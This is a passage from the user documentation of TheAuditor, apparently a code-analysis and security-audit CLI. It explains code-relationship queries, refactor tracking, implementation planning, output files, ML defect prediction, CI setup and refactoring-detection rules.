# Scope understanding (monorepo detection, token estimates, migration paths)
aud blueprint --structure

# Dependency mapping (gateway files, circular deps, bottlenecks)
aud blueprint --graph

# Attack surface (unprotected endpoints, auth patterns, SQL injection risk)
aud blueprint --security

# Data flow (vulnerable flows, sanitization coverage, dynamic dispatch)
aud blueprint --taint

# Export everything for AI consumption
aud blueprint --all --format json
```

Each drill-down shows facts about what exists and where - no recommendations, just ground truth for surgical refactoring.

#### Code Queries: Relationship Lookups

Use `aud query` when you need to:
- Understand code relationships without reading files
- Trace function call chains (who calls what)
- Map file dependencies (import/export relationships)
- Find API endpoint implementations
- Explore React component hierarchies
- Save tokens during AI-assisted refactoring

#### Query Types

**1. Symbol Queries** - Find function/class definitions and their relationships:

```bash
# Find symbol definition
aud query --symbol authenticateUser

# Find who calls this function (direct callers)
aud query --symbol validateInput --show-callers

# Find transitive callers (3 levels deep)
aud query --symbol sanitizeHtml --show-callers --depth 3

# Find what this function calls
aud query --symbol handleRequest --show-callees
```

**2. File Dependency Queries** - Map import/export relationships:

```bash
# Show all dependencies for a file (both incoming and outgoing)
aud query --file src/auth.ts

# Show only files that import this module (dependents)
aud query --file src/utils.ts --show-dependents

# Show only files this module imports (dependencies)
aud query --file src/api.ts --show-dependencies
```

**3. API Endpoint Queries** - Find route handlers and security coverage:

```bash
# Find handler for specific route
aud query --api "/users/:id"

# Find all user-related endpoints
aud query --api "/users"

# Check API security coverage (which endpoints are protected)
aud query --show-api-coverage

# Find unprotected endpoints
aud query --show-api-coverage | grep "[OPEN]"
```

**4. Component Tree Queries** - React/Vue component hierarchies:

```bash
# Get component information, hooks used, and child components
aud query --component UserProfile

# Explore component tree
aud query --component Dashboard
```

#### Output Formats

Control output format for different use cases:

```bash
# Human-readable text (default)
aud query --symbol authenticateUser --show-callers

# AI-consumable JSON
aud query --symbol validateInput --show-callers --format json

# Visual tree (for transitive queries)
aud query --symbol handleRequest --show-callers --depth 3 --format tree

# Save to file
aud query --file src/auth.ts --format json --save analysis.json
```

#### Transitive Queries

Follow call chains through multiple levels:

```bash
# Direct callers only (depth=1, default)
aud query --symbol validateInput --show-callers

# Callers of callers (depth=2)
aud query --symbol sanitizeHtml --show-callers --depth 2

# 3 levels deep (callers → callers → callers)
aud query --symbol executeQuery --show-callers --depth 3

# Maximum depth (depth=5)
aud query --symbol logEvent --show-callers --depth 5
```

#### Example Workflows

**Refactoring a Function:**
```bash
# 1. Find all callers
aud query --symbol processPayment --show-callers --depth 2

# 2. Understand what it calls
aud query --symbol processPayment --show-callees

# 3. Save complete context
aud query --symbol processPayment --show-callers --depth 3 --format json --save payment_context.json
```

**Understanding File Impact:**
```bash
# 1. Find all files that import this module
aud query --file src/database.ts --show-dependents

# 2. Find what this file imports
aud query --file src/database.ts --show-dependencies

# 3. Save dependency map
aud query --file src/database.ts --format json --save db_deps.json
```

**API Endpoint Investigation:**
```bash
# 1. Find endpoint handler
aud query --api "/api/users"

# 2. Find what the handler calls
aud query --symbol createUser --show-callees

# 3. Trace authentication chain
aud query --symbol authenticateRequest --show-callers --depth 2
```

#### Context: Semantic Refactor Tracking

`aud context` lets you tag obsolete/current code paths and follow large-scale migrations with the same verifiable evidence the SAST pipeline uses.

1. **Describe the refactor in YAML** (store anywhere in your repo or playbooks):

```yaml
context_name: "auth_migration"
patterns:
  obsolete:
    - id: legacy_session
      pattern: "sessionStore\\."
      replacement: "tokenProvider."
  current:
    - id: token_auth
      pattern: "tokenProvider\\."
```

2. **Apply the overlay and emit a plan/reports:**

```bash
aud context --file refactors/auth_migration.yaml --verbose
```

3. **Run context-aware queries (optional):**

```bash
# Same switches as aud query, but filtered to the semantic set
aud context query --symbol authenticateUser --show-callers --depth 2 --format json
```

Outputs include counts per context, file:line evidence, and JSON payloads your AI assistant can ingest alongside `aud blueprint`/`aud query` results to keep business terminology consistent.

#### Performance Characteristics

All queries use indexed database lookups:
- **Symbol lookup**: <5ms (indexed by name and type)
- **Direct callers/callees**: <10ms (indexed by function name)
- **Transitive queries** (depth=3): <50ms (BFS with cycle detection)
- **File dependencies**: <10ms (indexed by file path)
- **API handlers**: <5ms (indexed by route pattern)
- **Component trees**: <10ms (indexed by component name)

**No file I/O** - all data comes from `.pf/repo_index.db` and `.pf/graphs.db`.

#### Prerequisites

Code context queries require indexed database:

```bash
# 1. Index the codebase first
aud index

# 2. Build dependency graph (for file dependency queries)
aud graph build

# 3. Run queries
aud query --symbol myFunction --show-callers
```

#### Troubleshooting

**"Database not found" error:**
```bash
# Solution: Run indexing first
aud index
```

**"Graph database not found" error (for file dependency queries):**
```bash
# Solution: Build dependency graph
aud graph build
```

**Empty results:**
- Verify symbol name is exact match (case-sensitive)
- Check if file path includes correct directory structure
- Ensure graph was built for dependency queries

**Slow queries:**
- Queries should be <50ms on projects up to 100k LOC
- If slower, check database size and consider upgrading SQLite

#### Integration with Other Commands

Code context queries complement other TheAuditor commands:

```bash
# Find complex function
aud cfg analyze --complexity-threshold 15

# Understand its call graph
aud query --symbol complexFunction --show-callers --depth 3

# Check impact radius
aud impact --file src/payment.py --line 42

# Visualize dependencies
aud graph viz --view impact --impact-target "src/payment.py"
```

### Dependency Management

Check for outdated or vulnerable dependencies:

```bash
# Check for latest versions
aud deps --check-latest

# Scan for known vulnerabilities
aud deps --vuln-scan

# Update all dependencies to latest
aud deps --upgrade-all
```

---

### Implementation Planning & Verification

**NEW in v1.4.2-RC1**: Track implementation plans, verify task completion against specs, and maintain audit trail.

The Planning System (`aud planning`) provides database-centric task management with specification-based verification and git snapshots for audit trails.

#### Creating and Managing Plans

**Create a plan:**
```bash
# Initialize a new implementation plan
aud planning init --name "API Migration" --description "Migrate to REST v2"
# Output: Created plan 1: API Migration
```

**Add tasks with verification specs:**
```bash
# Add task with YAML verification spec
aud planning add-task 1 --title "Migrate auth endpoints" --spec jwt_migration.yaml

# Add simple task without spec
aud planning add-task 1 --title "Update documentation"

# Add task with assignee
aud planning add-task 1 --title "Review changes" --assigned-to "Alice"
```

**View plan and tasks:**
```bash
# Show plan summary
aud planning show 1

# Show plan with all tasks
aud planning show 1 --tasks

# Show detailed information
aud planning show 1 --tasks --verbose
```

#### Verification Specs (YAML)

Verification specs are YAML refactor profiles that define expected code patterns. Planning system runs them through RefactorRuleEngine to verify task completion:

```yaml
# jwt_migration.yaml
refactor_name: JWT Security Migration
description: Ensure JWT signing uses environment secrets
rules:
  - id: jwt-sign-secret
    description: JWT sign should use process.env.JWT_SECRET
    match:
      identifiers: [jwt.sign]
    expect:
      identifiers: [process.env.JWT_SECRET]
```

**Run verification:**
```bash
# Verify task completion against spec
aud planning verify-task 1 1 --verbose

# Auto-update task status based on result
aud planning verify-task 1 1 --auto-update
```

**Verification output:**
```
Verifying task 1...

Verification complete:
  Total violations: 21

Violations by rule:
  jwt-sign-secret: 21 violations
    - backend/src/services/auth.service.ts:247
    - backend/src/services/auth.service.ts:253
    - backend/src/services/auth.service.ts:405
    ... and 18 more
Snapshot created: 52a4a089
```

#### Task Management

**Update task status:**
```bash
# Mark task as in progress
aud planning update-task 1 1 --status in_progress

# Mark task as completed
aud planning update-task 1 1 --status completed

# Mark as blocked
aud planning update-task 1 1 --status blocked
```

**Update task assignee:**
```bash
# Reassign task
aud planning update-task 1 2 --assigned-to "Bob"
```

#### Git Snapshots and Audit Trail

Planning system creates git snapshots at key checkpoints for audit trail:

**Automatic snapshots:**
- `verify-task` creates snapshot on verification failure (rollback point)
- `archive` creates final snapshot with deployment notes

**Manual snapshots:**
```bash
# Archive completed plan with notes
aud planning archive 1 --notes "Deployed to production 2025-10-30"
# Output: Plan 1 archived successfully
#         Final snapshot: a857d295
#         Files affected: 4
```

**View rollback instructions:**
```bash
# List all snapshots for a plan
aud planning rewind 1

# Show rollback commands for specific checkpoint
aud planning rewind 1 --checkpoint "pre-migration"
# Output: To revert to this state, run:
#           git checkout 52a4a089
```

**Note**: `rewind` only shows git commands - it does NOT execute them. User reviews before applying.

#### Complete Workflow Example

```bash
# 1. Create plan
aud planning init --name "JWT Security Migration"

# 2. Add tasks with verification specs
aud planning add-task 1 --title "Secure JWT signing" --spec jwt_spec.yaml
aud planning add-task 1 --title "Add JWT expiration" --spec jwt_expiry_spec.yaml

# 3. Make code changes for task 1
# ... edit files ...

# 4. Re-index to update database
aud index

# 5. Verify task completion
aud planning verify-task 1 1 --verbose
# Output: 21 violations found (needs more work)

# 6. Fix violations and re-verify
# ... fix issues ...
aud index
aud planning verify-task 1 1 --auto-update
# Output: 0 violations, task status updated to completed

# 7. Continue with remaining tasks
aud planning show 1 --tasks
# Shows task 1 completed, task 2 pending

# 8. Archive when all tasks done
aud planning archive 1 --notes "Migration complete, deployed 2025-10-30"
```

#### Database Structure

Planning state lives in `.pf/planning.db` (separate from `repo_index.db`):

**Why separate?**
- `repo_index.db` is regenerated fresh on every `aud full` run
- `planning.db` persists across runs (plans don't disappear)
- Different query patterns (OLTP vs OLAP)

**Tables:**
- `plans` - Implementation plans (id, name, status, metadata)
- `plan_tasks` - Tasks within plans (task_number, status, spec_id)
- `plan_specs` - YAML verification specs
- `code_snapshots` - Git snapshots at checkpoints (git_ref, files)
- `code_diffs` - Full unified diffs for audit trail

#### Use Cases

**Complex Refactors:**
```bash
# Track multi-step refactoring with verification
aud planning init --name "Product Price Migration"
aud planning add-task 1 --title "Move price to variant" --spec pricing_spec.yaml
# ... implement and verify each step ...
```

**Deployment Audit Trail:**
```bash
# Maintain deployment history
aud planning archive 1 --notes "v2.0 deployed 2025-10-30, 47 files changed"
aud planning rewind 1  # Show snapshots for rollback if needed
```

**Ensure Migration Completeness:**
```bash
# Use verification specs to ensure no old patterns remain
aud planning verify-task 1 1 --verbose
# Checks entire codebase against spec, reports all violations
```

**Performance:**
- Plan creation: <50ms
- Task queries: <10ms
- Verification: 100ms-5s (depends on spec complexity)
- Archive with snapshots: 200ms-2s

---

## Architecture: Truth Courier vs Insights

### Understanding the Separation of Concerns

TheAuditor implements a strict architectural separation between **factual observation** (Truth Courier modules) and **optional interpretation** (Insights modules). This design ensures the tool remains an objective source of ground truth while offering actionable intelligence when needed.

### The Core Philosophy

TheAuditor doesn't try to understand your business logic or make your AI "smarter." Instead, it solves the real problem: **LLMs lose context and make inconsistent changes across large codebases.**

The workflow:
1. **You tell AI**: "Add JWT auth with CSRF tokens and password complexity"
2. **AI writes code**: Probably inconsistent due to context limits
3. **You run**: `aud full`
4. **TheAuditor reports**: All the inconsistencies and security holes
5. **AI reads the report**: Now sees the complete picture across all files
6. **AI fixes issues**: With full visibility of what's broken
7. **Repeat until clean**

### Truth Courier Modules (Core)

These modules report verifiable facts without judgment:

```python
# What Truth Couriers Report - Just Facts
{
    "taint_analyzer": "Data from req.body flows to res.send at line 45",
    "pattern_detector": "Line 45 matches pattern 'unsanitized-output'",
    "impact_analyzer": "Changing handleRequest() affects 12 downstream functions",
    "graph_analyzer": "Module A imports B, B imports C, C imports A"
}
```

**Key Truth Couriers:**
- **Indexer**: Maps all code symbols and their locations
- **Taint Analyzer**: Traces data flow through the application
- **Impact Analyzer**: Maps dependency chains and change blast radius
- **Graph Analyzer**: Detects cycles and architectural patterns
- **Pattern Detector**: Matches code against security patterns

### Insights Modules (Optional Scoring)

These optional modules add technical scoring and classification:

```python
# What Insights Add - Technical Classifications
{
    "taint/insights": {
        "vulnerability_type": "Cross-Site Scripting",
        "severity": "HIGH"
    },
    "graph/insights": {
        "health_score": 70,
        "recommendation": "Reduce coupling"
    }
}
```

**Installation:**
```bash
# Single installation command (includes all features)
pip install -e .

# All insights (ML, graph, taint, impact) installed by default
# Activation is runtime opt-in via specific commands:
# - aud learn --enable-git  (ML training)
# - aud suggest  (ML predictions)
# - aud insights --mode graph  (graph health)
```

### Correlation Rules: Detecting YOUR Patterns

Correlation rules detect when multiple facts indicate an inconsistency in YOUR codebase:

```yaml
# Example: Detecting incomplete refactoring
- name: "PRODUCT_VARIANT_REFACTOR"
  co_occurring_facts:
    - tool: "grep"
      pattern: "ProductVariant.*retail_price"  # Backend changed
    - tool: "grep"
      pattern: "product\\.unit_price"         # Frontend didn't
```

This isn't "understanding" that products have prices. It's detecting that you moved a field from one model to another and some code wasn't updated. Pure consistency checking.

The correlation engine loads rules from `/correlations/rules/`. We provide common patterns, but many are project-specific. You write rules that detect YOUR patterns, YOUR refactorings, YOUR inconsistencies.

### Why This Works

**What doesn't work:**
- Making AI "understand" your business domain
- Adding semantic layers to guess what you mean
- Complex context management systems

**What does work:**
- Accept that AI will make inconsistent changes
- Detect those inconsistencies after the fact
- Give AI the full picture so it can fix them

TheAuditor doesn't try to prevent mistakes. It finds them so they can be fixed.

### Practical Example

```bash
# You ask AI to implement authentication
Human: "Add JWT auth with CSRF protection"

# AI writes code (probably with issues due to context limits)
AI: *implements auth across 15 files*

# You audit it
$ aud full

# TheAuditor finds issues
- "JWT secret hardcoded at auth.js:47"
- "CSRF token generated but never validated"
- "Auth middleware missing on /api/admin/*"

# You can also check impact of changes
$ aud impact --file "auth.js" --line 47
# Shows: "Changing this affects 23 files, 47 functions"

# AI reads the audit and can now see ALL issues
AI: *reads .pf/readthis/*
AI: "I see 5 security issues across auth flow. Fixing..."

# AI fixes with complete visibility
AI: *fixes all issues because it can see the full picture*
```

### Key Points

1. **No Business Logic Understanding**: TheAuditor doesn't need to know what your app does
2. **Just Consistency Checking**: It finds where your code doesn't match itself
3. **Facts, Not Opinions**: Reports what IS, not what SHOULD BE
4. **Complete Dependency Tracing**: Impact analyzer shows exactly what's affected by changes
5. **AI + Audit Loop**: Write → Audit → Fix → Repeat until clean

This is why TheAuditor works where semantic understanding fails - it's not trying to read your mind, just verify your code's consistency.

---

## Understanding the Output

### Directory Structure

After running analyses, results are organized in **`.pf/`**:

```
.pf/
├── raw/                    # Raw, unmodified tool outputs (Truth Couriers)
│   ├── linting.json       # Raw linter results
│   ├── patterns.json      # Pattern detection findings
│   ├── taint_analysis.json # Taint analysis results
│   ├── graph.json         # Dependency graph data
│   └── graph_analysis.json # Graph analysis (cycles, hotspots)
│
├── insights/              # Optional interpretive analysis (Insights modules)
│   ├── ml_suggestions.json # ML predictions and patterns
│   ├── taint_insights.json # Vulnerability severity scoring
│   └── graph_insights.json # Health scores and recommendations
│
├── readthis/              # AI-consumable chunks
│   ├── manifest.md        # Repository overview
│   ├── patterns_001.md    # Chunked findings (65KB max)
│   ├── patterns_002.md    
│   ├── taint_001.md       # Chunked taint results
│   ├── tickets_001.md     # Actionable issue tickets
│   └── summary.md         # Executive summary
│
├── graphs/                # Graph visualizations
│   ├── import_graph.dot   # Dependency graph DOT file
│   ├── import_graph_cycles.dot # Cycles-only view
│   └── import_graph.svg   # SVG visualization (if generated)
│
├── pipeline.log           # Complete execution log
├── error.log             # Error details (if failures occur)
├── findings.json         # Consolidated findings
├── risk_scores.json      # Risk analysis results
└── report.md             # Human-readable report
```

### Key Output Files

#### `.pf/raw/`
Contains **unmodified outputs** from each tool. These files preserve the exact format and data from linters, scanners, and analyzers. **Never modified** after creation. This is the source of ground truth.

#### `.pf/insights/`
Contains **optional interpretive analysis** from Insights modules. These files add technical scoring and classification on top of raw data. Only created when insights commands are run.

#### `.pf/graphs/`
Contains **graph visualizations** in DOT and image formats. Generated by `aud graph viz` command with various view modes for focusing on specific concerns.

#### `.pf/readthis/`
Contains processed, **chunked data optimized for AI consumption**:
- Each file is under **65KB** by default (configurable via `THEAUDITOR_LIMITS_MAX_CHUNK_SIZE`)
- Maximum 3 chunks per file by default (configurable via `THEAUDITOR_LIMITS_MAX_CHUNKS_PER_FILE`)
- Structured with clear headers and sections
- Includes context, evidence, and suggested fixes
- Ready for direct consumption by **Claude**, **GPT-4**, etc.

#### `.pf/pipeline.log`
Complete execution log showing:
- Each phase's **execution time**
- **Success/failure** status
- Key statistics and findings
- Error messages if any

#### `.pf/error.log`
Created only when errors occur. Contains:
- Full **stack traces**
- Detailed error messages
- Phase-specific failure information
- Debugging information

---

## Advanced Usage

### Custom Pattern Rules

Create custom detection patterns in **`.pf/patterns/`**:

```yaml
# .pf/patterns/custom_auth.yaml
name: weak_password_check
severity: high
category: security
pattern: 'password\s*==\s*["\']'
description: "Hardcoded password comparison"
test_template: |
  def test_weak_password():
      assert password != "admin"
```

### ML-Powered Predictions (v1.4.2-RC1)

TheAuditor's ML module learns from your project's execution history to predict defect probability, likely root causes, and files needing future edits.

**Installation**: ML dependencies installed by default. Activation is runtime opt-in.

#### Quick Start

```bash
# 1. Generate training data (run full pipeline at least once)
aud full

# 2. Train models on execution history
aud learn --print-stats

# 3. Train with enhanced git temporal features (recommended)
aud learn --enable-git --print-stats

# 4. Generate predictions for workset
aud suggest --print-plan

# 5. Re-train with human feedback (continuous learning)
aud learn-feedback --feedback-file corrections.json
```

#### What ML Learns From

**4-Tier Intelligence Architecture**:

1. **Tier 1 - Pipeline.log**: Macro phase timing (which stages took longest, which had critical findings)
2. **Tier 2 - Journal.ndjson**: Micro event tracking (file touch frequency, finding counts, patch success rates)
3. **Tier 3 - raw/*.json**: Ground truth findings (taint paths, CVE scores, pattern matches, CFG complexity)
4. **Tier 4 - Git History** (NEW): Temporal signals
   - Commit frequency (churn indicator)
   - Team collaboration patterns (ownership dispersion)
   - Code recency (staleness detection)
   - Activity consistency (sustained vs burst patterns)

**Total Features**: 93 dimensions
- 50+ static code features (complexity, patterns, types)
- 7 historical execution features (touches, failures, RCA)
- **4 git temporal features** (commits, authors, recency, activity)
- 50 text features (path hashing)

#### Three Predictive Models

**1. Root Cause Classifier**
- **Predicts**: Files likely causing build/test failures
- **Training data**: Historical FCE failures from journal.ndjson
- **Output**: Probability [0.0, 1.0] + confidence interval
- **Use case**: "Which file is probably breaking the build?"

**2. Next Edit Predictor**
- **Predicts**: Files likely needing future modifications
- **Training data**: Journal file_touch events + git recency
- **Output**: Probability [0.0, 1.0] + confidence interval
- **Use case**: "Which files will I need to update next for this feature?"

**3. Risk Scorer**
- **Predicts**: Defect probability per file
- **Training data**: Weighted RCA failures + critical findings + git churn
- **Output**: Risk score [0.0, 1.0]
- **Use case**: "Which files are most likely to have bugs?"

#### Training Options

```bash
# Basic training (uses journal + database features)
aud learn

# With git temporal features (recommended)
aud learn --enable-git

# Use diff runs instead of full runs for training
aud learn --train-on diff

# Use all historical runs (both full and diff)
aud learn --train-on all

# Print detailed training statistics
aud learn --print-stats

# Specify window size for journal analysis
aud learn --window 100

# Custom model output directory
aud learn --model-dir .custom/ml/

# Re-train with human feedback
aud learn --feedback corrections.json
```

#### Human Feedback Format

Correct ML predictions by providing ground truth:

```json
{
  "src/auth.py": {
    "is_risky": true,
    "is_root_cause": false,
    "will_need_edit": true
  },
  "src/api.ts": {
    "is_risky": false,
    "is_root_cause": true,
    "will_need_edit": false
  }
}
```

Save as `corrections.json` and run:
```bash
aud learn-feedback --feedback-file corrections.json --print-stats
```

ML re-trains with 5x weight on your corrections, improving future predictions.

#### Generating Predictions

```bash
# Generate predictions for current workset
aud suggest

# Print predictions to console
aud suggest --print-plan

# Custom workset file
aud suggest --workset .pf/custom_workset.json

# Top 20 files instead of default 10
aud suggest --topk 20

# Custom output location
aud suggest --out predictions.json
```

#### Output Format

Predictions saved to `.pf/insights/ml_suggestions.json`:

```json
{
  "generated_at": "2025-10-31T12:00:00Z",
  "workset_size": 247,
  "likely_root_causes": [
    {
      "path": "src/auth.py",
      "score": 0.85,
      "confidence_std": 0.12
    }
  ],
  "next_files_to_edit": [
    {
      "path": "src/api.ts",
      "score": 0.73,
      "confidence_std": 0.08
    }
  ],
  "risk": [
    {
      "path": "legacy/old_auth.js",
      "score": 0.91
    }
  ]
}
```

**Confidence intervals**: Lower `confidence_std` = more reliable prediction.

#### When to Use Git Features

**Enable git features (`--enable-git`) when**:
- Your project has >100 commits
- Multiple developers contributing
- You want to detect stale/abandoned code
- Team collaboration patterns matter

**Skip git features when**:
- Fresh repository (<50 commits)
- Solo developer
- No git history available

#### Performance Characteristics

- **Training time**: ~5-10 seconds for 500 files
- **Inference time**: <100ms for 100-file workset
- **Incremental re-training**: <5 seconds with human feedback
- **Memory usage**: <50MB

#### Requirements

**Must run BEFORE training**:
1. `aud full` (at least once) - Generates journal.ndjson
2. Multiple full runs recommended for better training data

**Error: "No journal.ndjson files found"**
```bash
# Solution: Generate training data first
aud full
aud learn --enable-git --print-stats
```

#### How Pipelines.py Decides What Runs

**v1.4.2-RC1 Change**: ML dependencies installed by default, activation at runtime.

**Automatic activation during `aud full`**:
- IF trained models exist in `.pf/ml/`
- AND workset has source files
- THEN automatically runs `aud suggest` at end of pipeline
- ELSE skips ML (no models = no predictions)

**Manual activation**:
```bash
aud learn  # Trains models
aud suggest  # Generates predictions
```

**Graceful degradation**:
- Missing journal data: Clear error with remediation steps
- Missing git: Trains without git features (90 features instead of 93)
- Missing models: Suggests running `aud learn` first

#### Integration with AI Assistants

ML suggestions optimized for LLM consumption:

```python
# AI assistant reads predictions
import json
suggestions = json.load(open('.pf/insights/ml_suggestions.json'))

# Prioritize high-risk files
for file in suggestions['risk'][:5]:
    print(f"Review {file['path']} (risk: {file['score']:.2%})")

# Focus on likely root causes for debugging
for file in suggestions['likely_root_causes'][:3]:
    print(f"Check {file['path']} (root cause prob: {file['score']:.2%})")
```

**Workflow example**:
1. User: "Find the bug causing test failures"
2. AI reads `.pf/insights/ml_suggestions.json`
3. AI focuses on top 3 "likely_root_causes" files
4. AI reads those files + cross-references with `.pf/raw/fce.json`
5. AI identifies actual root cause faster (3 files instead of 247)

### Development-Specific Flags

#### Excluding TheAuditor's Own Files

When testing or developing within TheAuditor's repository (e.g., analyzing `fakeproj/project_anarchy/`), use the `--exclude-self` flag to prevent false positives from TheAuditor's own files:

```bash
# Exclude all TheAuditor files from analysis
aud index --exclude-self
aud full --exclude-self
```

This flag excludes:
- All TheAuditor source code directories (`theauditor/`, `tests/`, etc.)
- Root configuration files (`pyproject.toml`, `package-template.json`, `Dockerfile`)
- Documentation and build files

**Use case:** Testing vulnerable projects within TheAuditor's repository without framework detection picking up TheAuditor's own configuration files.

### CI/CD Integration

#### GitHub Actions Example

```yaml
name: Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.12'
      
      - name: Set up Node.js
        uses: actions/setup-node@v2
        with:
          node-version: '18'
      
      - name: Install TheAuditor
        run: |
          pip install -e ".[all]"
          aud setup-ai --target .
      
      - name: Run Audit
        run: aud full
        
      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v2
        with:
          name: audit-results
          path: .pf/
```

### Running TheAuditor on Its Own Codebase (Dogfooding)

When developing TheAuditor or testing it on itself, you need a special dual-environment setup:

#### Understanding the Dual-Environment Architecture

TheAuditor maintains strict separation between:
1. **Primary Environment** (`.venv/`) - Where TheAuditor runs from
2. **Sandboxed Environment** (`.auditor_venv/.theauditor_tools/`) - Tools TheAuditor uses for analysis

This ensures reproducibility and prevents TheAuditor from analyzing its own analysis tools.

#### Setup Procedure for Dogfooding

```bash
# 1. Clone and set up development environment
git clone https://github.com/TheAuditorTool/Auditor.git
cd theauditor
python -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate
pip install -e .

# 2. CRITICAL: Create the sandboxed analysis environment
aud setup-ai --target .

# 3. Verify setup
aud full --quick-test

# 4. Run full analysis on TheAuditor itself
aud full
```

#### Analyzing Test Projects Within TheAuditor

When analyzing test projects like `fakeproj/` from within TheAuditor's repository:

```bash
cd fakeproj/project_anarchy
aud full --exclude-self  # Excludes TheAuditor's own files
```

The `--exclude-self` flag prevents:
- Framework detection from identifying TheAuditor's `pyproject.toml`
- False positives from TheAuditor's configuration files
- Contamination from TheAuditor's source code

---

## Refactoring Detection

TheAuditor includes sophisticated capabilities for detecting incomplete refactorings, data model changes, and cross-stack inconsistencies.

### Understanding Refactoring Issues

Common refactoring problems TheAuditor detects:

1. **Data Model Evolution** - Fields moved between models (e.g., `product.price` → `variant.price`)
2. **Foreign Key Changes** - References updated in database but not in code
3. **API Contract Mismatches** - Frontend expects old structure, backend provides new
4. **Cross-Stack Inconsistencies** - TypeScript interfaces not matching backend models
5. **Incomplete Migrations** - Some code still using old field/table names

### How Refactoring Detection Works

TheAuditor uses multiple techniques:

#### Migration Analysis
Analyzes database migration files to understand schema changes:
```javascript
// Migration detected: Field moved from products to product_variants
removeColumn('products', 'unit_price');
addColumn('product_variants', 'retail_price', DataTypes.DECIMAL);
```

#### Impact Analysis
Traces dependencies to find all affected code:
```bash
aud impact --file "models/Product.ts" --line 42
# Shows: 47 files need updating
```

#### Pattern Detection
Over 30 refactoring-specific patterns detect common issues:
```yaml
- name: "PRODUCT_PRICE_FIELD_REMOVED"
  description: "Code accessing price on Product after migration to ProductVariant"
```

#### Cross-Stack Tracing
Matches frontend API calls to backend endpoints to detect contract mismatches.

### Using Refactoring Detection

#### Quick Detection
```bash
# Auto-detect from migrations
aud refactor --auto-detect

# Analyze specific change
aud refactor --file "models/Product.ts" --line 42

# Use with workset
aud refactor --workset

# Generate detailed report
aud refactor --auto-detect --output refactor_report.json
```

#### Best Practices for Refactoring

**Before Refactoring:**
1. Run impact analysis: `aud impact --file "model.ts" --line 42`
2. Create workset: `aud workset --from-impact`
3. Baseline analysis: `aud refactor --workset`

**During Refactoring:**
- Run incremental checks: `aud refactor --workset`
- Validate cross-stack: `aud impact --trace-to-backend`

**After Refactoring:**
- Full validation: `aud unified --mode refactor`
- Generate report: `aud report --format refactoring`

### Real-World Example

A product variant refactoring might be detected as:

```
PRODUCT_PRICE_FIELD_REMOVED
- Frontend: 23 files accessing product.unit_price
- Backend: Field moved to ProductVariant.retail_price
- Impact: POS system cannot display prices

ORDER_ITEMS_WRONG_REFERENCE
- Database: order_items.product_variant_id (new)
- Code: Still using order_items.product_id (old)
- Impact: Orders cannot be created
```

### Custom Refactoring Rules

TheAuditor uses YAML-based correlation rules to detect refactoring issues. These rules are YOUR business logic - you define what patterns indicate problems in YOUR codebase.

#### How It Works

1. **Rules Location**: `/theauditor/correlations/rules/refactoring.yaml`
2. **Rule Structure**: Each rule defines co-occurring facts that must ALL match
3. **Detection**: When all facts match, TheAuditor reports the issue
4. **No Code Changes**: Just edit YAML to define new patterns

#### Creating Your Own Rules

Edit `/theauditor/correlations/rules/refactoring.yaml` or create new YAML files:

```yaml
rules:
  - name: "MY_FIELD_MIGRATION"
    description: "Detect when price field moved but old code remains"
    co_occurring_facts:
      - tool: "grep"
        pattern: "removeColumn.*price"  # Migration removed field
      - tool: "grep"
        pattern: "product\\.price"      # Code still uses old field
    confidence: 0.92

  - name: "API_VERSION_MISMATCH"
    description: "Frontend calling v1 API but backend is v2"
    co_occurring_facts:
      - tool: "grep"
        pattern: "/api/v1/"             # Frontend uses v1
      - tool: "grep"
        pattern: "router.*'/v2/'"       # Backend only has v2
    confidence: 0.95
```

#### Available Tools for Facts

- **grep**: Pattern matching in files
- **patterns**: Matches from pattern detection
- **taint_analyzer**: Taint flow findings
- **lint**: Linter findings

#### Real Example from Production

```yaml
- name: "PRODUCT_VARIANT_REFACTOR"
  description: "Product fields moved to ProductVariant but frontend still uses old structure"
  co_occurring_facts:
    - tool: "grep"
      pattern: "ProductVariant.*retail_price.*Sequelize"  # Backend changed
    - tool: "grep"
      pattern: "product\\.unit_price|product\\.retail_price"  # Frontend didn't
  confidence: 0.92
```

This detects when you moved price fields from Product to ProductVariant model but frontend still expects the old structure.

---

## Troubleshooting

### Common Issues

#### "TypeScript compiler not available in TheAuditor sandbox"

**Solution**: Run **`aud setup-ai --target .`** to set up the sandbox.

#### "Coverage < 90% - run `aud capsules` first"

**Solution**: Generate code capsules for better analysis coverage:
```bash
aud index
aud workset --all
```

#### Linting produces no results

**Solution**: Ensure linters are installed:
```bash
# For Python
pip install -e ".[linters]"

# For JavaScript/TypeScript
aud setup-ai --target .
```

#### Pipeline fails at specific phase

**Solution**: Check **`.pf/error.log`** for details:
```bash
cat .pf/error.log
# Or check phase-specific error log
cat .pf/error_phase_08.log
```

#### Cache corruption or stale documentation

**Problem**: Analysis producing unexpected results or failing due to corrupted cache data.

**Symptoms**:
- Dependency documentation showing outdated versions
- AST parsing errors for unchanged files
- Unexpected analysis failures on previously successful runs

**Solution**: Force a complete cache rebuild:
```bash
aud full --wipecache  # Delete all caches before analysis
```

**What this does**:
- Deletes `.pf/.cache/` (AST parsing cache)
- Deletes `.pf/context/` (documentation cache and summaries)
- Forces fresh rebuild of all cached data
- Adds ~40-90 seconds to analysis time (one-time cost)

**When to use**:
- After major dependency version updates
- When seeing stale dependency documentation
- Cache corruption suspected
- First-time debugging of analysis issues

**Normal behavior**: Caches are PRESERVED between runs for performance (~40s savings). Only use `--wipecache` when troubleshooting.

### Performance Optimization

For large repositories:

```bash
# Limit analysis scope
aud workset --paths "src/critical/**/*.py"

# Run specific commands only
aud index && aud lint && aud detect-patterns

# Adjust chunking for larger context windows
export THEAUDITOR_LIMITS_MAX_CHUNK_SIZE=100000  # 100KB chunks
export THEAUDITOR_LIMITS_MAX_CHUNKS_PER_FILE=5   # Allow up to 5 chunks
```

### Runtime Configuration

TheAuditor supports environment variable overrides for runtime configuration:

```bash
# Chunking configuration
export THEAUDITOR_LIMITS_MAX_CHUNKS_PER_FILE=5     # Default: 3
export THEAUDITOR_LIMITS_MAX_CHUNK_SIZE=100000     # Default: 65000 (bytes)

# File size limits
export THEAUDITOR_LIMITS_MAX_FILE_SIZE=5242880     # Default: 2097152 (2MB)

# Timeout configuration
export THEAUDITOR_TIMEOUTS_LINT_TIMEOUT=600        # Default: 300 (seconds)
export THEAUDITOR_TIMEOUTS_FCE_TIMEOUT=1200        # Default: 600 (seconds)

